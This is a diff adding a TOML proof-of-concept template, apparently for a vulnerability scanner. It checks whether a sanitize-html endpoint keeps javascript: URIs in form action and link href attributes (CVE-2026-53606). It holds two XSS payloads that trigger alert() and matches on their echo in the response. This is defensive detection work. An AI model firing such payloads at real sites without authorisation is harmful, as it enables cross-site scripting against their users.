@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "验证 sanitize-html 在允许 action/formaction/data/poster/background 等非默认属性时，javascript: URI 能否绕过 naughtyHref() 检查。发送包含 javascript: URI 的 HTML 内容，检测是否被原样保留。"
+id = "POC-AVE-2026-0775"
+name = "sanitize-html URI方案验证不完整导致跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2026-0775"]
+vuln_id = [
+    "CVE-2026-53606",
+    "AVE-2026-0775",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/sanitize"
+protocol = "http"
+
+[poc.requests.body]
+content = "html=<form action=%22javascript:alert(document.domain)%22><button>Click</button></form>"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["javascript:alert"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/sanitize"
+protocol = "http"
+
+[poc.requests.body]
+content = "html=<a href=%22javascript:alert(1)%22>link</a>"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["javascript:alert"]
